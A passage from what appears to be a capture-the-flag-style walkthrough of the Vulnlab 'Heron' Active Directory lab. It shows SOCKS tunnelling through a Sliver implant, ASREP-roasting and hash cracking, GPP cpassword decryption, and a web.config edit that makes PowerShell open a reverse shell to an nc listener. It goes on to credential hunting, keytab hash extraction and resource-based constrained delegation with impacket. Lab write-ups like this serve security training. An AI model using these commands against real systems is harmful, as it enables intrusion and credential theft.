others.\n\n```\nsliver (heron_lin) > socks5 start\n\n[*] Started SOCKS5 127.0.0.1 1081  \n⚠  In-band SOCKS proxies can be a little unstable depending on protocol\n```\n\nNow that we have the proxy running through the implant, we'll need to edit our proxychains configuration file to reflect the port that the proxy is being served on. This can be found at either `/etc/proxychains.conf` or `/etc/proxychains4.conf`.\n\nThe setting that we'll need to change is at the bottom of the configuration file, denoted (with changes) from the below.\n\n```\n[ProxyList]\n# add proxy here ...\n# meanwhile\n# defaults set to \"tor\"\nsocks5 127.0.0.1 1081\n```\n\nNow that the configuration is set, you should be able to interact with the `proxychains4` (or `proxychains`) utility directly from Kali. This should be able to direct all of your tools to be executed within the space of the jumpbox instead of your local machine. Let's verify that this works by running an NMAP scan for port 445 (SMB) on the DC (just due to this being a default port).\n\n```\n└─$ proxychains4 nmap -sT -p445 10.10.128.117\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 23:40 EDT\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:80  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK\nNmap scan report for mucdc.heron.vl (10.10.128.117)\nHost is up (0.22s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nNmap done: 1 IP address (1 host up) scanned in 0.47 seconds\n```\n\nAs you can see, it seems that the SMB port is open on the DC meaning that the firewall is indeed active. This means that most (if not, all) of our tooling will need to go through our proxy.\n\nOur next step is to scan the DC to determine what other ports are available on it. I used SMB as a dummy port for the test above (which we know came back as an open port) so we'll look for ports aside from that.\n\nI've found that using NMAP through a SOCKS proxy is generally slow, due to having to go through the tunnel for each specific port. An easy workaround for this is scanning ports directly from jumpbox by dropping a binary to the machine. To prevent having to also recursively drop all of the libraries that NMAP uses, I decided to utilize an alternative being [rustscan](https://github.com/RustScan/RustScan).\n\nWe can upload the binary easily with Sliver's `upload` command.\n\n```\npentest@frajmp:/tmp$ chmod 777 rustscan\npentest@frajmp:/tmp$ ./rustscan -a 10.10.128.117\n......\nOpen 10.10.128.117:389\nOpen 10.10.128.117:445\nOpen 10.10.128.117:464\nOpen 10.10.128.117:53\nOpen 10.10.128.117:80\nOpen 10.10.128.117:88\nOpen 10.10.128.117:135\nOpen 10.10.128.117:139\nOpen 10.10.128.117:593\nOpen 10.10.128.117:636\nOpen 10.10.128.117:3268\nOpen 10.10.128.117:3269\nOpen 10.10.128.117:3389\nOpen 10.10.128.117:9389\n```\n\nAs you can see, the usual ports for a DC seem to be open (notably LDAP and RDP). However it seems as though a webserver is also open on the DC.\n\n# Tunneling to the HTTP Webserver on the DC\n\nBefore we interact with LDAP at all, I want to take a look to the at the webserver to see if there is anything for us to exploit initially.\n\nTo ensure that we know the domain name of the DC (the jumpbox's domain name is `frajmp` as seen in the SSH login), we can use `crackmapexec` to view the information with no credentials.\n\n```\n└─$ proxychains4 crackmapexec smb 10.10.128.117                                \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:135  ...  OK\nSMB         10.10.128.117   445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)\n```\n\nAs seen from the above, the DC's domain name is `mucdc.heron.vl`. We'll add this as well as `frajmp.heron.vl` to our `/etc/hosts` file to reflect any domain name resolutions that we might need in the future.\n\nWe'll need to use our SOCKS proxy to be able to access the webserver, which we can do by utilizing a separate profile in FoxyProxy. I usually use this solely for Burpsuite, so it's a nice change of pace to be able to use FoxyProxy for another purpose. Let's create another profile that uses the SOCKS proxy specifically.\n\n![](/images/vulnlab/heron-vl/c.png)\n\nMake sure that the `Port` and `Type` reflect the proxy accordingly. Once this profile is created, enable it through the FoxyProxy extension and attempt to access the webpage.\n\n![](/images/vulnlab/heron-vl/d.png)\n\nAs you can see from the image, it seems that this webpage is the static landing page for Heron Corp. While there isn't much to see here, we do have more users to add to our LDAP enumeration list that we'll be trying to exploit shortly.\n\nJust to ensure that we aren't missing any other web applications, let's try to see if we can access any subdomains running on this port. I ran into some issues running `gobuster` through the proxy from our local machine (mainly the webserver crashing), so let's try to do it from the jumpbox. Fortunately, `ffuf` does not use any additional libraries so I wouldn't expect there to be any issues if we drop the sole binary to the jumpbox.\n\nWe'll also need to drop a subdomain wordlist to use alongside `ffuf`, I usually opt to use `subdomains-top1million-110000.txt` from [SecLists](https://github.com/danielmiessler/SecLists). \n\n```\nsliver (heron_lin) > upload /usr/bin/ffuf\n\n[*] Wrote file to /tmp/ffuf\n\nsliver (heron_lin) > upload /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n\n[*] Wrote file to /tmp/subdomains-top1million-110000.txt\n```\n\nIf you receive a timeout on the Sliver upload command for `ffuf`, disregard as it should still upload it to the machine.\n\nIf we do run `ffuf` to enumerate subdomains, every request will come back with a 200 status code (indicating a false positive). We can avert this by excluding the size of the request that seems to be the same amongst all of the false positives using the `-fs` tag.\n\n```\npentest@frajmp:/tmp$ ./ffuf -w subdomains-top1million-110000.txt -u http://heron.vl -H \"Host: FUZZ.heron.vl\" -fs 4128\n\naccounting              [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 24ms]\n```\n\nWe seem to have received a `401` request for `accounting` as the subdomain, let's see if we can browse to it to understand why this specific subdomain is encountering an error.\n\n![](/images/vulnlab/heron-vl/e.png)\n\nThis subdomain seems to have authentication tied to it, meaning we won't be able to access it until later on in the attack path.\n\n# ASREPRoasting to Crack Passwords\n\nGiven the point that we're at now, we should have a few users that we can test against to determine if any users are vulnerable to kerberoasting or ASREProasting. The user list at this point should look like the following. (Note that I added a few usernames that are regularly on Windows workstations, such as `Administrator` and `Guest`)\n\n```\nAdministrator\nkrbtgt\nGuest\nsvc-web-accounting-d\nsvc-web-accounting\nwayne.wood\njulian.pratt\nsamuel.davies\n```\n\nLet's test for ASREProasting using Impacket's `GetNPUsers` tool. Essentially what this will do is check if the `NO_PREAUTH_REQUIRED` is set to the user's accounting. If this is set to a user account, we can essentially send an ASREQ to the KDC which will return an ASREP ticket that is encrypted with the users plaintext password.\n\nWe'll use the Guest account with no password to run this command.\n\n```\n└─$ proxychains4 impacket-GetNPUsers heron.vl/'Guest' -dc-ip 10.10.128.117 -no-pass -request -usersfile initial_ul.txt\n......\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:88  ...  OK\n$krb5asrep$23$samuel.davies@HERON.VL:11082947e1ef[...snip...]e1316ef77fc294\n```\n\nAs seen from above, a valid ASREP ticket was returned for the `samuel.davies` user. We can try to crack this using `hashcat` along with the specific hash ID (being 18200) as seen in the [hashcat wiki](https://hashcat.net/wiki/doku.php?id=example_hashes).\n\n```\n└─$ hashcat -a 0 -m 18200 samuel.davies.txt /usr/share/wordlists/rockyou.txt\n......\na6b5c3a4a77676b6134c9302e03726ef67af6288c07a47e44072e62fb80bad6d758edeacacfea413637179588c6a110a65570e84e9a9cf843663bd66f851e193a13943e1316ef77fc294:[...snip...]\n\nSession..........: hashcat\nStatus...........: Cracked\n```\n\nAs seen from the above, we were able to successfully crack the password for `samuel.davies`. This opens up our attack path to a range of various options, notably dumping LDAP as my initial thought.\n\n# Dumping LDAP\n\nLet's now dump the domain with Bloodhound and the [Python ingestor](https://github.com/dirkjanm/BloodHound.py). We can examine any domain objects and also determine if `samuel.davies` has any privileges against other users. This should also increase our user list as you'll see shortly.\n\n```\n└─$ proxychains4 bloodhound-python -d 'heron.vl' -u 'samuel.davies' -p '(SAMUEL.DAVIES PASSWORD)' -c all -ns 10.10.128.117 --zip\n......\nINFO: Compressing output into 20240628004605_bloodhound.zip\n```\n\nWe can now upload the compressed archive to Bloodhound after starting up the `neo4j` and `bloodhound` applications respectively.\n\nUpon viewing the domain objects, it does not seem that `samuel.davies` has any notable privileges to exploit in our situation. That being said, I did notice a privilege that one of the users on our current user list has.\n\n![](/images/vulnlab/heron-vl/f.png)\n\nIt seems that the `svc-web-accounting` has `GenericWrite` privileges over the `MUCJMP` workstation. While it seems that this chain only consists of two machines, it seems that there could be other machine accounts that are present within the environment.\n\nI did some more enumeration on the other machine accounts present in LDAP, and it seems that this environment also has `ACCOUNTING-PREP` and `ACCOUNTING-STAG`.\n\nMoving on from this, I made sure to utilize `ldapsearch` through our SOCKS proxy to increase our user list. I've made a script to do this for us, as seen below.\n\n```\n└─$ proxychains4 ldapsearch -x -LLL -H ldap://mucdc.heron.vl -D 'samuel.davies@heron.vl' -b 'DC=heron,DC=vl' -w '(SAMUEL.DAVIES PASSWORD)' | grep userPrincipalName | awk '{print $2}' | cut -d '@' -f 1 > full_ul.txt\n```\n\nAs we can see with the file created from `ldapsearch`, our user list has increased to over 20 users.\n\n```\nKatherine.Howard\nRachael.Boyle\nAnthony.Goodwin\nCarol.John\nRosie.Evans\nAdam.Harper\nAdam.Matthews\nSteven.Thomas\nAmanda.Williams\nVanessa.Anderson\nJane.Richards\nRhys.George\nMohammed.Parry\nJulian.Pratt\nWayne.Wood\nDanielle.Harrison\nSamuel.Davies\nAlice.Hill\nJayne.Johnson\nGeraldine.Powell\nadm_hoka\nadm_prju\nsvc-web-accounting\nsvc-web-accounting-dev\n```\n\nWe can test for kerberoasting/ASREProasting for these users, to which you will find that `svc-web-accounting` is kerberoastable. That being said even if you do get an encrypted Kerberos TGT from them, you are unable to crack it (from just using rockyou).\n\n# Enumerating SMB Shares\n\nI decided to move on from LDAP at this point, since it seems that we'll need to compromise another user through another service if we want to move forward in the attack chain. Since we have credentials for `samuel.davies`, we can see if there are any shares that we have read access to.\n\n```\n└─$ proxychains4 smbclient -L 10.10.128.117 -U 'samuel.davies'                     \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK\nPassword for [WORKGROUP\\samuel.davies]:\n\nSharename       Type      Comment\n---------       ----      -------\naccounting$     Disk      \nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nCertEnroll      Disk      Active Directory Certificate Services share\nhome$           Disk      \nIPC$            IPC       Remote IPC\nit$             Disk      \nNETLOGON        Disk      Logon server share \nSYSVOL          Disk      Logon server share \ntransfer$       Disk\n```\n\nAs you can see it seems that there are a lot of shares that are on the DC. \n\nI'll save us the time due to some prior enumeration that I did into this - it seems that we cannot access `accounting$` and `it$`, and `home$` and `transfer$` do not seem to have any files within any of their folders. \n\n`CertEnroll` did seem suspicious at first, as there seems to be a few expired ADCS certifications that I initially thought could be reused for exploitation. I eventually deduced this to be a rabbit hole and moved elsewhere.\n\nThe interesting part that I found however was in the `SYSVOL` share. I don't normally find much in this share (aside from the logon script exploit that I did for [Baby2](https://dan-feliciano.com/2024/06/05/baby2/)), however it's still important to enumerate everything possible in every share that you have access to for this service.\n\n```\nsmb: \\heron.vl\\Policies\\{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}\\Machine\\Preferences\\Groups\\> ls\n  .                                   D        0  Tue Jun  4 11:59:44 2024\n  ..                                  D        0  Tue Jun  4 11:59:44 2024\n  Groups.xml                          A     1135  Tue Jun  4 12:01:07 2024\n```\n\nIt seems that there is an XML file that we have read access to on the `SYSVOL` share. We'll pull this down to our local machine to see if in contains any relevant information.\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"><Group clsid=\"{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}\" name=\"Administrators (built-in)\" image=\"2\" changed=\"2024-06-04 15:59:45\" uid=\"{535B586D-9541-4420-8E32-224F589E4F3A}\"><Properties action=\"U\" newName=\"\" description=\"\" deleteAllUsers=\"0\" deleteAllGroups=\"0\" removeAccounts=\"0\" groupSid=\"S-1-5-32-544\" groupName=\"Administrators (built-in)\"><Members><Member name=\"HERON\\svc-web-accounting\" action=\"ADD\" sid=\"S-1-5-21-1568358163-2901064146-3316491674-24602\"/><Member name=\"HERON\\svc-web-accounting-d\" action=\"ADD\" sid=\"S-1-5-21-1568358163-2901064146-3316491674-26101\"/></Members></Properties></Group>\n        <User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"Administrator (built-in)\" image=\"2\" changed=\"2024-06-04 16:00:13\" uid=\"{F3B0115E-D062-46CC-B10C-C3EB743C824A}\"><Properties action=\"U\" newName=\"_local\" fullName=\"\" description=\"local administrator\" cpassword=\"[...snip...]\" changeLogon=\"0\" noChange=\"0\" neverExpires=\"1\" acctDisabled=\"0\" subAuthority=\"RID_ADMIN\" userName=\"Administrator (built-in)\"/></User>\n</Groups>\n```\n\nThe file itself seems to be configuring two of the domain user objects, specifically `svc-web-accounting` and `svc-web-accounting-d`. It seems that there also seems to be an encoded password for the \"local administrator\" user at the bottom of the file.\n\nI've seen this `cpassword` term before in other exploits that I've done in the past, and I do recall a tool that we can use to crack this password specifically. That tool is [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt). I'd tried to interpret the code a bit before doing it to understand what it was exactly doing. It seems that script takes the password and adds base64 padding to it before decoding the entire base64 string based on a specific AES key that is used for the `gpp` algorithm.\n\nWe can use the Python POC without needing to use the setup script within the repository, as seen below.\n\n```\n└─$ python3 gpp-decrypt/gpp-decrypt.py -f Groups.xml \n\n                               __                                __ \n  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_\n / _ `/  / _ \\  / _ \\/___// _  / / -_)/ __/ / __/ / // /  / _ \\/ __/\n \\_, /  / .__/ / .__/     \\_,_/  \\__/ \\__/ /_/    \\_, /  / .__/\\__/ \n/___/  /_/    /_/                                /___/  /_/         \n\n[ * ] Username: Administrator (built-in)\n[ * ] Password: [...snip...]\n```\n\nThis returns a password for the built-in Administrator user (which is not the Administrator of the DC), so we'll run this against our user list to see if the password corresponds to any users.\n\nQuick note, make sure to use the actual username for `svc-web-accounting-d` in the user list, as the LDAP command we used from before takes their display name which is `svc-web-accounting-dev`.\n\n```\n└─$ proxychains4 crackmapexec smb 10.10.128.117 -u full_ul.txt -p '(BUILT-IN ADMINISTRATOR PASSWORD)'\n......\nSMB         10.10.128.117   445    MUCDC            [+] heron.vl\\svc-web-accounting-d:[...snip...]\n```\n\nAs you can see, this should return a valid username/password combination for `svc-web-accounting-d`.\n\n# Exploiting the Accounting App\n\nNote that at this point I took a break in between creating this writeup, so the IP addresses will change. The updated addresses for `mucdc.heron.vl` and `frajmp.heron.vl` are `10.10.220.53` and `10.10.220.54`.\n\nSince we have valid credentials for `svc-web-accounting-d`, I decided to see if we had access to the `accounting$` SMB share that we saw previously.\n\n```\n└─$ proxychains4 smbclient \\\\\\\\10.10.220.53\\\\accounting$ -U 'svc-web-accounting-d'\nPassword for [WORKGROUP\\svc-web-accounting-d]:\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.54:445  ...  OK\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n\n  .                                   D        0  Fri Jun  7 02:14:04 2024\n  ..                                DHS        0  Sun Jun  2 11:26:14 2024\n  AccountingApp.deps.json             A    37407  Sun Jun  2 15:25:26 2024\n  AccountingApp.dll                   A    89600  Sun Jun  2 15:25:26 2024\n  AccountingApp.exe                   A   140800  Sun Jun  2 15:25:26 2024\n  AccountingApp.pdb                   A    39488  Sun Jun  2 15:25:26 2024\n  AccountingApp.runtimeconfig.json      A      557  Sat Jun  1 18:22:20 2024\n  appsettings.Development.json        A      127  Sat Jun  1 18:00:54 2024\n  ......\n```\n\nIt seems that we successfully were able to gain access to the `accounting$` share, and there seem to be a lot within the contents of this share.\n\nThere seems to be a consistent notice of this share having contents related to an accounting app, based on the file names. My guess to this is that this could potentially be the configuration directory for the accounting subdomain we found earlier.\n\nGiven that we have access to all of these files, I'm assuming that these will be valid credentials to the simple authentication that this website requires.\n\n![](/images/vulnlab/heron-vl/g.png)\n\nEntering in the credentials for `svc-web-accounting-d` seems to land us at the respective accounting application. This cements my theory that the SMB share seems to be linked to the backend of this application.\n\nGiven that we have access to the files that build up the accounting app, I'm assuming that we should have RCE if we exploit this appropriately. Let's take a look further into this share to see if there are any files to exploit.\n\nAfter doing a bit of research into this application (finding that this is an IIS application running ASP.NET), the actual exploitation consists of the `web.config` file that is located on the root directory of this SMB share.\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<configuration>\n  <location path=\".\" inheritInChildApplications=\"false\">\n    <system.webServer>\n      <handlers>\n        <add name=\"aspNetCore\" path=\"*\" verb=\"*\" modules=\"AspNetCoreModuleV2\" resourceType=\"Unspecified\" />\n      </handlers>\n      <aspNetCore processPath=\"dotnet\" arguments=\".\\AccountingApp.dll\" stdoutLogEnabled=\"false\" stdoutLogFile=\".\\logs\\stdout\" hostingModel=\"inprocess\" />\n    </system.webServer>\n  </location>\n</configuration>\n<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->\n```\n\nThis file specifically seems to be related to the runtime arguments that actually define how this application is initialized. As we can see, the `aspNetCore` module is created by executing `AccountingApp.dll`, which I'm assuming is then chained to execute all of the other libraries within this directory.\n\nAfter doing some research, I found an RCE exploit that we can utilize that uses `aspNetCore` module that is already present in the configuration file. The resource I used for RCE exploit can be found [here](https://medium.com/@jeroenverhaeghe/rce-from-web-config-461a5eab8ce9), all credit goes to Jeroen Verhaeghe.\n\nIf we alter the `aspNetCore` module to instead use PowerShell as its process path, we can pass in PowerShell arguments into the arguments section within the module. In theory, this should render the website unusable due to the application requiring the serialization of `AccountingApp.dll`. That being said, it should execute our payload before receiving this error. This was essentially the only way to achieve RCE that I found, I am open to understanding other ways to achieve this without rendering the web application unusable.\n\nSo with that being said let's replace the module initialization and the actual module itself, I've made the necessary changes to the file as seen below (Note that the payload that I'm using is from [revshells](https://www.revshells.com/)).\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<configuration>\n  <location path=\".\" inheritInChildApplications=\"false\">\n    <system.webServer>\n      <handlers>\n        <add name=\"aspNetCore\" path=\"execute.now\" verb=\"*\" modules=\"AspNetCoreModuleV2\" resourceType=\"Unspecified\" />\n      </handlers>\n      <aspNetCore processPath=\"powershell\" arguments=\"-e (POWERSHELL BASE64 PAYLOAD)\" hostingModel=\"OutOfProcess\" />\n    </system.webServer>\n  </location>\n</configuration>\n<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->\n```\n\nThe `POWERSHELL BASE64 PAYLOAD` that I used was the PowerShell #3 Base64 payload from [revshells](https://www.revshells.com/).\n\nWe'll start up our listener using `nc -lvnp 9002` and replace the `web.config` file that is currently in the SMB share with the new changes. You can do so by just removing the current config and putting your new config in the share.\n\n```\nsmb: \\> rm web.config\nsmb: \\> put web.config\nputting file web.config as \\web.config (5.8 kb/s) (average 5.8 kb/s)\n```\n\nLet's now browse to the path that we specified to execute the PowerShell payload, which is `http://accounting.heron.vl/execute.now`.\n\nAs you can see from the netcat payload, we'll receive a callback as `svc-web-accounting` on the DC.\n\n```\n└─$ nc -lvnp 9002      \nlistening on [any] 9002 ...\nconnect to [10.8.0.173] from (UNKNOWN) [10.10.220.53] 58887\nPS C:\\webaccounting> whoami\nheron\\svc-web-accounting\n```\n\n# Credential Hunting as svc-web-accounting\n\nThe interesting part that I found about this is that fact that there is a timeout on the web application that will essentially crash our current reverse shell after about a minute. This isn't very good practice in the real world, however it's essentially all that we can do at this with the only POC that I could think of. Again, very open to any different solutions that keep the reverse shell continuously up.\n\n![](/images/vulnlab/heron-vl/h.png)\n\nLuckily enough we can continue to get a reverse shell if we reopen our netcat listener and refresh the `execute.now` page. Had `svc-web-accounting` not been kerberoastable and their password WAS crackable, we could simply poison a request to a Responder endpoint and crack their NetNTLMv2 hash.\n\nLuckily enough, we won't need this shell for very long. At this point, I enumerated the filesystem in between the intervals of the web application crashing. The `C:\\` drive seems to be the parent directory of all of the SMB shares. \n\n```\nDirectory: C:\\\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          6/1/2024   8:10 AM                home\nd-----         5/26/2024   2:31 AM                inetpub\nd-----          6/6/2024   7:22 AM                it\nd-----          5/8/2021   1:20 AM                PerfLogs\nd-r---          6/6/2024   7:22 AM                Program Files\nd-----          6/1/2024   7:30 AM                Program Files (x86)\nd-----         5/26/2024   4:51 AM                transfer\nd-r---          6/1/2024   8:43 AM                Users\nd-----         6/28/2024  12:38 PM                webaccounting\nd-----          6/2/2024   8:26 AM                Windows\n-a----          6/2/2024   3:45 AM             36 flag.txt\n```\n\nYou can also see that the first flag is within the `C:\\` drive, meaning we have completed a 1/3 of this chain.\n\nTo save some time, I spent a decent amount of attempts looking through all of the folders recursively to see if any DPAPI credentials or really just any credentials were cached in any files. After about an hour of credential hunting, I came across a file within `C:\\Windows\\scripts\\ssh.ps1`.\n\n```\nPS C:\\Windows\\scripts> cat ssh.ps1\n$plinkPath = \"C:\\Program Files\\PuTTY\\plink.exe\"\n$targetMachine = \"frajmp\"\n$user = \"_local\"\n$password = \"[...snip...]\"\n& \"$plinkPath\" -ssh -batch $user@$targetMachine -pw $password \"ps auxf; ls -lah /home; exit\"\n```\n\nThis seems to contain the SSH password for the `_local` user. An admin user was probably trying to establish an SSH session to the `frajmp` jumpbox as this user using PuTTY.\n\nNow that we have these credentials, we can try to login as this user on the jumpbox. We also won't need our reverse shell as `svc-web-accounting` any longer.\n\n# Root Access to FRAJMP\n\nNow that we have access as this user, we'll login in our other session as `pentest`.\n\n```\npentest@frajmp:/tmp$ su _local\nPassword: \n_local@frajmp:/tmp$\n```\n\nTesting our root access with the password that we currently have indicates to me that this user has SUDO privileges to the entire filesystem.\n\n```\n_local@frajmp:/tmp$ sudo -l\n[sudo] password for _local: \nMatching Defaults entries for _local on localhost:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser _local may run the following commands on localhost:\n    (ALL : ALL) ALL\n```\n\nSince we have that, we can simply log in as the root user using `sudo su`.\n\n```\n_local@frajmp:/tmp$ sudo su\nroot@frajmp:/tmp# whoami\nroot\n```\n\nThe second flag for this machine is within the root users home directory in `/root`. There isn't much to see aside from that, I did some file enumeration and did not come back with much.\n\nI'll execute our Sliver implant just to ensure that we have access to the root user through our C2 server. This is just in case we need to tunnel any tools to the DC with the highest privilege on `FRAJMP`. --> `./heron_lin &`\n\n![](/images/vulnlab/heron-vl/i.png)\n\n# Pivoting to the DC\n\nNow that we have completely compromised the `FRAJMP` jumpbox, we can extract a very important piece of information on domain-joined Linux machines that I learned to exploit during [Hybrid](https://dan-feliciano.com/2024/06/05/hybrid/).\n\nThere's a file that exists on domain-joined Linux machines called `krb5.keytab`, which contains secrets to the machine account. If this file is decrypted, we can view the machine accounts NT hash. This machine account has the potential to have privileges that can lead us to the DC.\n\nWe can use a tool called [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) for this. The Python script associated with this allows us to match key values with their encryption types, varying from different types of AES encryption algorithms. Once decrypted with the keytab file (you can download this to your local machine using Sliver), you should receive an output similar to the below.\n\n```\n└─$ python3 KeyTabExtract/keytabextract.py krb5.keytab \n[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.\n[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.\n[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.\n[+] Keytab File successfully imported.\n        REALM : HERON.VL\n        SERVICE PRINCIPAL : FRAJMP$/\n        NTLM HASH : 6f55b[...snip...]e8254f7\n        AES-256 HASH : 7be44e62e24[...snip...]a3050dd586130e7\n        AES-128 HASH : dcaae[...snip...]6cbd0cd\n```\n\nNow that we have this machine account we would be able to use it in a variety of different domain escalation tactics if `FRAJMP$` has any privileges over any other domain objects.\n\nThat being said, we actually are not required to do this. I did some testing with `crackmapexec` to see if their was any password reusage on the `_local` user credentials that we have and came back with a successful result to a new user.\n\n```\n└─$ proxychains4 crackmapexec smb 10.10.220.53 -u full_ul.txt -p '(_local PASSWORD)' --continue-on-success\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:135  ...  OK\n......\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK\nSMB         10.10.220.53    445    MUCDC            [+] heron.vl\\Julian.Pratt:[...snip...]\n```\n\nAs you can see, the `Julian.Pratt` user seems to have the same password as the `_local` user on the jumpbox. We can assume that `Julian.Pratt` (with him being the head of IT) was attempting to try and set up an SSH connection to `FRAJMP` using PuTTY.\n\nSince we have access to this user now with his credentials, we can login to his home directory that is being hosted on SMB.\n\n```\nsmb: \\Julian.Pratt\\> ls\n  .                                   D        0  Sun Jun  2 06:47:14 2024\n  ..                                  D        0  Sat Jun  1 11:10:46 2024\n  frajmp.lnk                          A     1443  Sun Jun  2 06:47:47 2024\n  Is there a way to -auto login- in PuTTY with a password- - Super User.url      A      117  Sat Jun  1 11:44:44 2024\n  Microsoft Edge.lnk                  A     2312  Sat Jun  1 11:44:38 2024\n  mucjmp.lnk                          A     1441  Sun Jun  2 06:47:33 2024\n```\n\nIt seems that this contains a multitude of `lnk` files that we can pull from this share. We'll use `mget *` to read these on our local machine.\n\n`frajmp.lnk` seems to be partially unreadable, however it contains the plaintext password for `_local` and `Julian.Pratt` that we already have. `Microsoft Edge.lnk` also does not seem to have anything of use to us, containing some directory calls to the Edge application.\n\nThe part of use to us seems to be within `mucjmp.lnk`, which seems to contain the plaintext password for `adm_prju` amongst some unreadable text.\n\n```\n└─$ cat mucjmp.lnk                                                                 \n2t▒`��ف+B�� �gP�O� �:i�+00�/C:\\�1�X�sPROGRA~1t  ﾨR�B�X�s.BJz\nAProgram Files@shell32.dll,-21781▒P1�X�[PuTTY<  ﾺX�[�X�[.���PuTTY\\2 ��X�� putty.exeD    ﾆX���X�[.putty.exe▒O-N�h�ZC:\\Program Files\\PuTTY\\putty.exe#..\\..\\Program Files\\PuTTY\\putty.exeC:\\Program Files\\PuTTY$adm_prju@mucjmp -pw [...snip...]�&�\n```\n\n# RBCD to MUCDC\n\nIf we look at `adm_prju`'s domain node in Bloodhound, we can see that they possess an interesting outbound access control.\n\n![](/images/vulnlab/heron-vl/j.png)\n\nIt seems that since `adm_prju` is within the `ADMINS_T1` group, they have the `WriteAccountRestrictions` privilege over the domain controller.\n\nHaving `WriteAccountRestrictions` means that `adm_prju` has write access to all of the attributes on the machine, notably `msDS-AllowedToActOnBehalfOfOtherIdentity`. If we have the ability to modify this attribute, this means we can abuse resource-based constrained delegation.\n\nFor a small note on what resource-based constrained delegation is, it essentially allows us to request a service ticket for a specified service name to which will be impersonated by a user of our selection. We can then import this service ticket to use for either authentication or credential dumping, depending on the user we impersonate.\n\nThe process for this is relatively simple, as Bloodhound outlines our attach flow in their help page for this specific attack. Note that this requires the user to have control of a machine that has an SPN set, which we currently do since we have control over `FRAJMP` and it's NT hash (meaning we'll just need to PTH with the `FRAJMP$` NT hash in our commands instead of a password).\n\nSo to start let's ensure that `FRAJMP$` can delegate on behalf of `MUCDC$`.\n\n```\n└─$ proxychains4 impacket-rbcd -delegate-from 'FRAJMP$' -delegate-to 'MUCDC$' -action 'write' 'heron.vl/adm_prju:(ADM_PRJU PASSWORD)'\n......\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:389  ...  OK\n[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty\n[*] Delegation rights modified successfully!\n[*] FRAJMP$ can now impersonate users on MUCDC$ via S4U2Proxy\n[*] Accounts allowed to act on behalf of other identity:\n[*]     FRAJMP$      (S-1-5-21-1568358163-2901064146-3316491674-27101)\n```\n\nNow that the jumpbox can delegate on behalf of the domain controller, we can request the TGT with Impacket's `getST` tool. This will utilize both `S4U2Self` and `S4U2Proxy` to impersonate the specified user and obtain a valid service ticket for that user. \n\nI found that the Administrator account is disabled and was replaced with `_admin`, so we'll request for that user instead. You could also request to impersonate `MUCDC$`, as we'll be able to dump credentials with both of those accounts.\n\n```\n└─$ proxychains4 impacket-getST -spn 'cifs/mucdc.heron.vl' -impersonate '_admin' 'heron.vl/FRAJMP$' -hashes :(FRAJMP NT HASH)\n......\n[proxychains] DLL init: proxychains-ng 4.17\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT for user\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  HERON.VL:88  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  HERON.VL:88  ...  OK\n[*] Impersonating _admin\n[*] Requesting S4U2self\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:88  ...  OK\n[*] Requesting S4U2Proxy\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  heron.vl:88  ...  OK\n[*] Saving ticket in _admin@cifs_mucdc.heron.vl@HERON.VL.ccache\n```\n\nThe 